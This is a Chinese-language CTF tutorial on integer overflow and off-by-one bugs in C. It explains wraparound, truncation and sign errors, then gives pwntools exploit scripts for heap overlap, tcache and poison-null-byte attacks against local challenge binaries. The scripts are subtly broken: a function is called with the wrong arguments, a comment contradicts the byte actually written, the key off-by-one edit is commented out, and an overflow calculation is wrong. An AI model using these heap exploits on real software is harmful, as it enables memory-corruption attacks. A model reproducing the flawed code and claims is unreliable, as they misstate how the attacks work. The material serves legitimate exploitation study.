---
category: "整数漏洞"
tags: ["整数溢出", "off-by-one", "size_t", "符号错误", "整型截断"]
difficulty: "中级"
---

# 整数溢出与off-by-one漏洞

## 1. 概述

整数溢出（Integer Overflow/Underflow）是由于C/C++中整型的固定宽度限制，当运算结果超出表示范围时发生回绕。off-by-one是指边界检查差1个单位的错误，两者经常结合产生严重后果——尤其是与堆利用结合时。

CTF离线场景中，整数溢出通常不是独立漏洞，而是扩大攻击面的"放大镜"：一个字节的溢出通过精心构造可以转化为任意读写。

## 2. 核心原理

### 2.1 整型范围（64位系统）

| 类型 | 位数 | 有符号范围 | 无符号范围 |
|------|------|-----------|-----------|
| char | 8 | -128 ~ 127 | 0 ~ 255 |
| short | 16 | -32768 ~ 32767 | 0 ~ 65535 |
| int | 32 | -2^31 ~ 2^31-1 | 0 ~ 2^32-1 |
| long long | 64 | -2^63 ~ 2^63-1 | 0 ~ 2^64-1 |
| size_t | 64 (x64) | 0 ~ 2^64-1 | 0 ~ 2^64-1 (始终无符号) |

### 2.2 溢出类型

```c
// 1. 上溢 (Overflow)
unsigned short x = 65535;
x += 1;  // x = 0 (回绕)
uint32_t y = 0xFFFFFFFF;
y += 1;  // y = 0

// 2. 下溢 (Underflow)
size_t z = 0;
z -= 1;  // z = 0xFFFFFFFFFFFFFFFF (size_t无符号)

// 3. 截断 (Truncation)
int input = 0x10001;
char truncated = (char)input;  // truncated = 1 (仅保留低8位)

// 4. 符号转换
ssize_t n = -1;
size_t m = n;  // m = 0xFFFFFFFFFFFFFFFF (符号扩展后按无符号解释)
```

### 2.3 Off-by-one分类

```c
// 类型1: 边界条件错误
char buf[256];
for (int i = 0; i <= 256; i++)  // BUG: 应为 i < 256
    buf[i] = src[i];

// 类型2: strlen不含\x00
char *src = "...";
size_t len = strlen(src);       // 不含\x00
memcpy(dst, src, len);         // 没有复制终止符，dst有残余数据

// 类型3: 堆off-by-one
void edit_chunk(size_t idx, char *data) {
    size_t size = chunks[idx].size;
    memcpy(chunks[idx].ptr, data, size + 1);  // BUG: 多写1字节
}

// 类型4: Null byte off-by-one (poison null byte)
chunks[idx].ptr[size] = '\0';  // 无条件添加终止符
```

### 2.4 与堆利用结合

off-by-one 最常见的利用是 **null byte off-by-one**（poison null byte）：
```
1. 修改下一chunk的size字段的PREV_INUSE位 -> 触发后向合并
2. 修改下一chunk的size字段低字节 -> 改变chunk大小，实现overlap
3. 修改prev_size的低字节 -> 精确控制合并后的chunk起始位置
```

## 3. 关键技巧/检测方法

### 3.1 常见漏洞模式

```python
# 源码审计检查清单：
checklist = [
    "malloc(size + 1)  # off-by-one堆分配",
    "read(0, buf, nbytes)  # nbytes可能是负数(无符号化后超大)",
    "realloc(ptr, newsize) # newsize=0时行为特殊",
    "calloc(nmemb, size)  # nmemb * size可能溢出",
    "for(i=0; i<=n; i++)  # 边界差1",
    "strncpy(dst, src, len) # len不含\x00",
    "sprintf(buf, \"%.*s\", len, src) # 截断",
]
```

### 3.2 整数溢出的IDA模式

```python
# IDA中常见的溢出模式
# 1. imul / add / sub 后无边界检查
# 2. movzx/movsx 大小调整
# 3. cdqe / cqo 符号扩展
# 4. malloc参数中的算术运算

# 示例IDA反编译:
# size_t total = n * 0x10;     // n可控，无上限检查
# void *ptr = malloc(total);    // 若n=0x10000001, total = 0x10 (溢出)
```

## 4. 常见误区与注意事项

1. **size_t是平台相关**：32位是uint32_t，64位是uint64_t
2. **read返回值是ssize_t**：负值表出错，直接用于malloc会变极大正数
3. **calloc内部乘法**：`calloc(n, size)`做n*size，溢出返回NULL或极小chunk
4. **realloc(ptr, 0)**：相当于free(ptr)，返回NULL（可能造成UAF）
5. **负数索引**：`arr[-1]`在数组边界前，可访问到其他数据

## 5. 实战示例

### 5.1 整数溢出导致堆分配过小

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
整数溢出利用：通过size_t溢出使malloc分配过小缓冲区，实现堆溢出
典型场景：total_size = count * elem_size 溢出后变小
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./int_overflow')
elf = ELF('./int_overflow')

# ---- 场景：count * 0x100 溢出 ----
# 32位程序: count = 0x01000001 时, count * 0x100 = 0x100 (只保留低32位)
# 64位程序: count = 0x0000000100000001, count * 0x100 = 0x100 (溢出)

# 假设64位，count 为 int32_t
# elem_size = 0x100
# total = count * elem_size -> int32 截断后 -> malloc(total)
# 若 count = 0x1000001, total = 0x100 (实际只分配256字节!)
# 但程序循环 count 次写入，导致堆溢出

# ---- 利用 ----
# Step 1: 通过溢出修改相邻chunk的头部
# 类似堆溢出的利用链

# 构造溢出count
overflow_count = 0x10000001  # 32位溢出为1
# 但实际要进行0x10000001次write...不可行

# 更实用的场景：
def exploit_int_underflow():
    """
    整数下溢：read返回-1转为size_t极大值
    """
    # 假设代码：
    # ssize_t n = read(fd, buf, max_size);
    # if (n < 0) return;
    # char *p = malloc(n + 1);  // n=-1 -> size_t -> 0xFFFFFFFFFFFFFFFF -> malloc失败

    # 利用方法：当read返回0时，n=0，malloc(1)，仅有1字节空间
    pass

# ---- 更实际的CTF场景：off-by-one + tcache ----
def off_by_one_attack():
    """
    典型off-by-one + tcache利用
    通过off-by-one修改下一chunk的size，使free时进入不同bin
    或overlap两个chunk
    """

    def add(idx, size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendlineafter(b'size:', str(size).encode())

    def edit(idx, size, data):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendlineafter(b'size:', str(size).encode())
        # off-by-one漏洞: 实际写入 size+1 字节
        p.sendafter(b'data:', data)

    def delete(idx):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())

    # 分配chunk
    add(0, 0x28)  # 实际0x30
    add(1, 0x100) # 实际0x110, size=0x111(PREV_INUSE=1)
    add(2, 0x10)  # 屏障chunk

    # off-by-one: 多写一个字节到chunk1的size
    # 将 chunk1->size 从 0x111 改为 0x200 (增大)
    # 使free时认为chunk1包含chunk2
    edit(0, 0x28, b'A' * 0x28 + p8(0x00))  # 覆盖chunk1->size低字节

    # free(1): 认为chunk1很大(包含chunk2)
    delete(1)

    # 分配更大的chunk -> 获取overlap chunk，包含chunk2的控制权
    add(3, 0x1F0, b'B' * 0x1F0)

    # 此时chunk3与chunk2重叠，可对chunk2进行UAF操作

off_by_one_attack()
p.interactive()
```

### 5.2 符号错误利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
有符号/无符号比较错误利用
int vs size_t 比较绕过
"""
from pwn import *

context.arch = 'amd64'

# ---- 漏洞代码示例 ----
# int length;  // 有符号
# size_t max_len = 0x100;
# if (length > max_len) return -1;  // 比较! length为负数时绕过!
# char *buf = malloc(length + 1);   // length=-1 -> size_t极大值

p = process('./sign_error')

# 发送负数的length
# 通过简单的send发送-1的二进制表示
# 在32位: -1 = 0xFFFFFFFF
# 在64位: 需看实际输入
# 假设length为int32_t
evil_len = -1  # 0xFFFFFFFF
p.send(p32(evil_len))  # 发送负数length

# 比较: -1 > 0x100? NO (int转size_t比较? 看编译器实现)
# 通常: if((size_t)length > max_len) -> 0xFFFFFFFF > 0x100 -> YES 绕过
# 或: if(length > (int)max_len) -> -1 > 256 -> NO 不绕过
# 或: if(length < 0 || length > max_len) -> -1 < 0 -> YES 检测到

# 绕过情况取决于代码写法，在CTF中需调试确定
p.interactive()
```

### 5.3 Null Byte Poisioning 完整利用

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Poison Null Byte 完整利用 (glibc 2.27)
通过null byte off-by-one构造overlap chunk
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = process('./poison_null')

def add(idx, size, data=b''):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data:
        p.sendafter(b'data:', data)

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'idx:', str(idx).encode())

# ---- 堆布局 ----
# 分配A, B, C三个chunk，B需要特定size
add(0, 0x80)   # A: 0x90
add(1, 0x100)  # B: 0x110, size=0x111, 注意size末字节
add(2, 0x80)   # C: 0x90 屏障
add(3, 0x80)   # D: 防止合并

# ---- 在A中构造假prev_size ----
# B被free时会查prev_size确定前一个chunk位置
# 我们需要prev_size指向A内部的某个位置
fake_chunk_offset = 0x20  # A内部偏移
# B的prev_size = &B - (&A + fake_chunk_offset)
prev_size = 0x90 - fake_chunk_offset  # = 0x70

# off-by-one 写入:
# 1. 将prev_size写入B的prev_size字段
# 2. 将B->size末字节清零(原本0x111 -> 0x100)
payload = b'A' * 0x80           # 填充A的数据
payload += p64(prev_size)        # B->prev_size = 指向A内的假chunk
payload += p64(0x100)            # 实际上这覆盖了B->size(需要off-by-one精确写一个\x00)
# 实际off-by-one: edit(0, 0x80 + 8 + 8 + 1) -> 多写1字节
add(0, 0x80, b'X' * 0x80 + p64(prev_size))
# edit(0, 0x80, b'Y' * 0x80 + p64(prev_size) + b'\x00')  # 多写\x00到B->size

# ---- 在A内部构造假chunk ----
# 假chunk在A的0x20偏移处
# fake_chunk->prev_size = 0, fake_chunk->size = prev_size | PREV_INUSE
# 还需要在假chunk结束后构造next_chunk's prev_size
# 简化：假chunk的size需要能覆盖B

# ---- 释放B，触发后向合并 ----
delete(1)

# ---- 此时A(加上假chunk)成为一个大chunk覆盖了C ----
# 分配这个大chunk
add(4, 0x1A0)  # 获取overlap chunk

# ---- 通过chunk4读写chunk2(C)的内容 ----
# 实现UAF或信息泄露
show(2)  # C仍然存在但是被overlap了

p.interactive()
```

## 6. 相关知识点

- **堆利用基础**：chunk结构、bin管理见 04-堆利用基础.md
- **House of Einherjar**：null byte off-by-one的高级应用见 05-堆利用进阶.md
- **格式化字符串**：有时与off-by-one结合进行堆地址泄露
- **safe-linking绕过**：glibc 2.32+需要heap基址泄露
- **IDAGhidra脚本**：自动化检测整数溢出模式
